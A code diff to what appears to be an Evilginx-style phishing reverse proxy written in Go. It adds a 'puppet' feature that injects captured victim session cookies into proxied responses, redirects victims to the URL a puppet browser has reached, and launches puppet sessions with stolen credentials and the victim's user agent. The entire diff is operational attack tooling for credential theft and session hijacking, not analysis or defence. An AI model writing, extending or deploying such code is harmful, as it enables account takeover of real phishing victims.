@@ -241,18 +241,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							var js_params *map[string]string = nil
 							js_params = &s.Params
 
-							script, err := pl.GetScriptInjectById(js_id, js_params)
-							if err == nil {
-								d_body += script + "\n\n"
-							} else {
-								log.Warning("js_inject: script not found: '%s'", js_id)
+							if js_id != "sync" {
+								script, err := pl.GetScriptInjectById(js_id, js_params)
+								if err == nil {
+									d_body += script + "\n\n"
+								} else {
+									log.Warning("js_inject: script not found: '%s'", js_id)
+								}
 							}
+							
+							// Replace session_id placeholder
+							d_body = strings.ReplaceAll(d_body, "{session_id}", session_id)
+
 							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
 							
 							// Inject captured cookies if available
 							if pm := GetPuppetMaster(); pm != nil {
 								if cookies := pm.sessionMap.GetCookies(session_id); cookies != nil {
-									log.Info("js_inject: injecting %d cookies for session %s", len(cookies), session_id)
+									log.Debug("js_inject: injecting %d cookies for sync session %s", len(cookies), session_id)
 									for _, cookie := range cookies {
 										if name, ok := cookie["name"].(string); ok {
 											if val, ok := cookie["value"].(string); ok {
@@ -297,12 +303,50 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
+
+							// Also inject cookies for the primary poll script
+							if pm := GetPuppetMaster(); pm != nil {
+								if cookies := pm.sessionMap.GetCookies(session_id); cookies != nil {
+									for _, cookie := range cookies {
+										if name, ok := cookie["name"].(string); ok {
+											if val, ok := cookie["value"].(string); ok {
+												c := &http.Cookie{Name: name, Value: val, Path: "/"}
+												if secure, ok := cookie["secure"].(bool); ok && secure { c.Secure = true }
+												if httpOnly, ok := cookie["httpOnly"].(bool); ok && httpOnly { c.HttpOnly = true }
+												resp.Header.Add("Set-Cookie", c.String())
+											}
+										}
+									}
+								}
+							}
+
 							return req, resp
 						} else {
 							log.Warning("js: session not found: '%s'", session_id)
 						}
 					} else {
 						if _, ok := p.sessions[session_id]; ok {
+							// If puppet is running, check if it navigated to a new URL
+							if pm := GetPuppetMaster(); pm != nil {
+								if ps, exists := pm.GetSession(session_id); exists {
+									p_url := ps.CurrentURL
+									if p_url != "" && !strings.Contains(p_url, "about:blank") {
+										// Translate original URL back to phished URL
+										ph_url, _ := p.replaceHostWithPhished(p_url)
+										
+										type ResponseRedirectUrl struct {
+											RedirectUrl string `json:"redirect_url"`
+										}
+										d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: ph_url})
+										if err == nil {
+											log.Debug("[PUPPET] Syncing victim navigation to puppet URL: %s", ph_url)
+											resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
+											return req, resp
+										}
+									}
+								}
+							}
+
 							redirect_url, ok := p.waitForRedirectUrl(session_id)
 							if ok {
 								type ResponseRedirectUrl struct {
@@ -949,8 +993,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					// Fallback to fingerprint for whitelisted IPs or first-arrival POSTs
 					sid = fmt.Sprintf("%s_%s", remote_addr, req.UserAgent())
 				}
-				if modifiedReq, intercepted := p.interceptor.InterceptRequest(req, sid); intercepted {
-					req = modifiedReq
+				if midReq, midResp, intercepted := p.interceptor.InterceptRequest(req, sid); intercepted {
+					if midResp != nil {
+						// Short-circuit: return this response immediately
+						if midResp.StatusCode == http.StatusFound {
+							if pm := GetPuppetMaster(); pm != nil {
+								if ps, exists := pm.GetSession(sid); exists {
+									ph_url, _ := p.replaceHostWithPhished(ps.CurrentURL)
+									midResp.Header.Set("Location", ph_url)
+									log.Important("[PROXY] Interceptor short-circuit: Redirecting victim to puppet's URL: %s", ph_url)
+								}
+							}
+						}
+						return req, midResp
+					}
+					req = midReq
 					log.Debug("[PROXY] Request intercepted and modified by puppet module (session: %s)", sid)
 				}
 			}
@@ -2202,7 +2259,9 @@ func (p *HttpProxy) triggerPuppet(victimSession string, phishletName string, req
 		if shouldTrigger {
 			log.Info("[PUPPET] Launching puppet session for trigger '%s' (session: %s)", trigger.Name, victimSession)
 			t := trigger // Create a local copy to pass a stable pointer
-			_, err := pm.LaunchPuppetForSession(victimSession, creds, &t)
+			ua := ""
+			if req != nil { ua = req.UserAgent() }
+			_, err := pm.LaunchPuppetForSession(victimSession, creds, &t, ua)
 			if err != nil {
 				log.Error("[PUPPET] Failed to launch puppet session: %v", err)
 			}
